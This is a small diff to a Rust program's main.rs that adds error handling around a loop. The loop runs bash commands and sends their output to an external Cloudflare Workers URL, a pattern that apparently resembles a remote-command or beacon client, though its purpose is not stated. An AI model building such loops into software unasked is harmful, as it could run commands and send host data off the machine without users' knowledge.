@@ -1,3 +1,4 @@
+// main.rs
 mod command_executor;
 mod worker_communication;
 
@@ -5,7 +6,13 @@ mod worker_communication;
 async fn main() {
     let worker_url = "https://serverworker.adoba.workers.dev/";
     loop {
-        let output = command_executor::execute_bash_command(true);
+        let output = match command_executor::execute_bash_command(true) {
+            Ok(output) => output,
+            Err(e) => {
+                println!("Command execution failed: {}", e);
+                continue;
+            }
+        };
 
         if !output.status.success() {
             println!("Command execution failed: {}", String::from_utf8_lossy(&output.stderr));
@@ -13,7 +20,6 @@ async fn main() {
         }
 
         let command_output = String::from_utf8_lossy(&output.stdout).to_string();
-
         // Send the command output to the Worker
         let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
             Ok(response) => response,
